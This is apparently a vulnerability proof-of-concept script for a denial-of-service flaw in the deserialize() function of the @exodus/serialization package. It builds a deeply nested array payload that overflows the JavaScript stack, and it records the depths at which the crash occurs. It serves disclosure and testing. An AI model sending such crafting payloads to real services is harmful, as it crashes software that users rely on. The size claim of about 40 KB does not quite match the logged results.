// PoC: Unbounded recursion (stack overflow crash) in @exodus/serialization
//
// Affected package: @exodus/serialization  (ships inside ExodusOSS/hydra -> libraries/serialization)
// Function: deserialize() returned by createSerializeDeserialize()
// Class: CWE-674 Uncontrolled Recursion -> CWE-400 (DoS by crash)
//
// deserialize() recurses on nested `{ t:'object'|'array', v:... }` nodes with NO
// depth limit. A small (~40 KB) deeply-nested payload overflows the JS stack and
// throws RangeError, crashing the surface that runs it. Unlike the base58 issue,
// the input is TINY and the result is an outright crash.
//
// Reachability: deserialize() is applied to incoming data at message boundaries,
// e.g. @exodus/browser-extension-rpc:  onData(deserialize(data)).
//
// Run (from a checkout of ExodusOSS/hydra):
//   cd libraries/serialization
//   # stub the one bytes import the array/object recursion path never actually uses:
//   mkdir -p node_modules/@exodus/bytes
//   printf '{"name":"@exodus/bytes","type":"module","exports":{"./base64.js":"./base64.js"}}' > node_modules/@exodus/bytes/package.json
//   printf 'export const toBase64=(u)=>Buffer.from(u).toString("base64");export const fromBase64=(s)=>new Uint8Array(Buffer.from(s,"base64"))' > node_modules/@exodus/bytes/base64.js
//   node ../../<this file>   # or copy this file into libraries/serialization/

import createSD from './src/index.js'

const { deserialize } = createSD()

// Build {t:'array', v:[ {t:'array', v:[ ... ]} ]} nested `depth` levels deep.
function nest(depth) {
  let o = 0
  for (let i = 0; i < depth; i++) o = { t: 'array', v: [o] }
  return o
}

// Approx serialized size of the payload (what an attacker would send)
const approxBytes = (d) => JSON.stringify(nest(d)).length

for (const d of [1000, 5000, 20000, 50000]) {
  try {
    deserialize(nest(d))
    console.log(`depth ${d} (~${approxBytes(d)} bytes): ok`)
  } catch (e) {
    console.log(`depth ${d} (~${approxBytes(d)} bytes): CRASH -> ${e.constructor.name}: ${e.message}`)
  }
}

// Observed:
// depth 1000  (~ 24 KB): ok
// depth 5000  (~120 KB): CRASH -> RangeError: Maximum call stack size exceeded
// depth 20000+        : CRASH
// (exact crash threshold depends on stack size; ~40-120 KB is enough)
